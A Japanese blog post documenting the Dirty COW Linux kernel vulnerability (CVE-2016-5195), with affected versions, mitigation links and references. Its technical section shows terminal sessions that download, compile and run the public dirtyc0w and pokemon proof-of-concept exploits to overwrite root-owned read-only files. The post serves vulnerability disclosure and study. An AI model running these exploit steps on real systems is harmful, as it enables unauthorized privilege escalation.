---
layout: post
title:  "CVE-2016-5195 - Dirty Cow"
date:   2016-10-21 12:00:00 +0900
categories: vlunerability
toc: true
---

# CVE-2016-5195

## 概要

本脆弱性は適切なアクセス権が設定されていない変更を防ぐことになる標準許可メカニズムをバイパスして、書き込み権限のないファイルに対しての書き込みをローカルシステムアカウントを用いて可能にします。 これは、メモリ内の実行可能mmapのページを有し、かつmadvise（MADV_DONTNEED）システムコールをレースすることによって達成されます。
すべてのローカルユーザーが読むことができる任意のファイルに書き込むことができます。

## CVSS v3

2016/10/24日時点でNVDには未公開

## 解決策、緩和策情報

 * Kernelのupdate
 * [緩和策](https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c13)

## 影響を受けるソフトウェアとバージョン

 * Linux Kernel 2.6.22 - 2016年10月18日より前に出たkernel

redhat、centosには脆弱なversionを特定するためのスクリプトが存在します。このスクリプトはredhat,centosの標準的なカーネルを精査することはできますが、独自でビルドしたカーネルについては検出することができません。

 * https://access.redhat.com/security/vulnerabilities/2706661

## 技術的な詳細

 * [修正コミット](https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?id=89eeba1594ac641a30b91942961e80fae978f839)

### debian 8.6 jessie

 * dirtyc0w exploit 

```
kosuke@CVE-2016-5195 ~ $ lsb_release -a
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 8.6 (jessie)
Release:        8.6
Codename:       jessie
kosuke@CVE-2016-5195 ~ $ sudo -s
root@CVE-2016-5195:/home/kosuke# echo this is not a test > foo
root@CVE-2016-5195:/home/kosuke# chmod 0404 foo
root@CVE-2016-5195:/home/kosuke# exit
exit
kosuke@CVE-2016-5195 ~ $  ls -lah foo
-r-----r-- 1 root root 19 10月 21 16:28 foo
kosuke@CVE-2016-5195 ~ $ cat foo
this is not a test
kosuke@CVE-2016-5195 ~ $  gcc -lpthread dirtyc0w.c -o dirtyc0w
kosuke@CVE-2016-5195 ~ $ ./dirtyc0w foo m00000000000000000
mmap 7c6cb000

madvise 0

procselfmem 1800000000

kosuke@CVE-2016-5195 ~ $ cat foo
m00000000000000000
```

 * pokemon exploit

```
kosuke@CVE-2016-5195 ~ $ wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/pokemon.c
kosuke@CVE-2016-5195 ~ $ echo pikachu|sudo tee pokeball;ls -l pokeball;gcc -pthread pokemon.c -o d;./d pokeball miltank;cat pokeball
pikachu
-rw-r--r-- 1 root root 8 10月 24 10:13 pokeball
pokeball
   (___)
   (o o)_____/
    @@ `     \
     \ ____, /miltank
     //    //
    ^^    ^^
mmap bbc02000

madvise 0

ptrace 0

miltank

kosuke@CVE-2016-5195 ~ $ cat pokeball
miltank
```


## 追跡が必要な情報源

 * [CERT](https://www.kb.cert.org/vuls/byid?query=CVE-2016-5195&searchview=)
 * [Debian](https://security-tracker.debian.org/tracker/CVE-2016-5195)
 * [Github](https://github.com/search?q="CVE-2016-5195")
 * [LWN](https://lwn.net/Search/DoSearch?words=CVE-2016-5195)
 * [NVD](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-5195)
 * [PacketStorm](https://packetstormsecurity.com/search/?q=CVE-2016-5195)
 * [Redhat](https://access.redhat.com/security/cve/CVE-2016-5195)
 * [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2016-5195.html)
 * [bugtraq](https://marc.info/?s=CVE-2016-5195&l=bugtraq)
 * [bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2016-5195)
 * [centos](https://www.centos.org/forums/search.php?keywords=CVE-2016-5195)
 * [cvedetail](http://www.cvedetails.com/cve/CVE-2016-5195/)
 * [exploitdb](https://www.exploit-db.com/search/?action=search&cve=2016-5195)
 * [fulldisc](https://marc.info/?s=CVE-2016-5195&l=full-disclosure)
 * [metasploit](https://www.rapid7.com/db/search?q=CVE-2016-5195)
 * [oss-sec](https://marc.info/?s=CVE-2016-5195&l=oss-security)
 * [twitter](https://twitter.com/search?q=CVE-2016-5195)

# 参考文献

 * http://dirtycow.ninja/
 * https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c
 * http://news.softpedia.com/news/linux-kernel-zero-day-cve-2016-5195-patched-after-being-deployed-in-live-attacks-509494.shtml?utm_content=buffere34c2&utm_medium=social&utm_source=linkedin.com&utm_campaign=buffer
 * https://twitter.com/DirtyCOWVuln
 * https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
 * http://www.cyberciti.biz/faq/dirtycow-linux-cve-2016-5195-kernel-local-privilege-escalation-vulnerability-fix/
 * https://linuxjm.osdn.jp/html/LDP_man-pages/man2/madvise.2.html
 * http://www.nminoru.jp/~nminoru/programming/view_process_mem.html
 * https://git.kernel.org/cgit/linux/kernel/git/stable/linux-stable.git/commit/?id=89eeba1594ac641a30b91942961e80fae978f839
 * https://linuxjm.osdn.jp/html/LDP_man-pages/man2/lseek.2.html
 * http://www.cyberciti.biz/faq/dirtycow-linux-cve-2016-5195-kernel-local-privilege-escalation-vulnerability-fix/
 * https://linuxjm.osdn.jp/html/LDP_man-pages/man2/mmap.2.html
 * https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
 * http://japan.zdnet.com/article/35090987/
 * http://www.theregister.co.uk/2016/10/21/linux_privilege_escalation_hole/

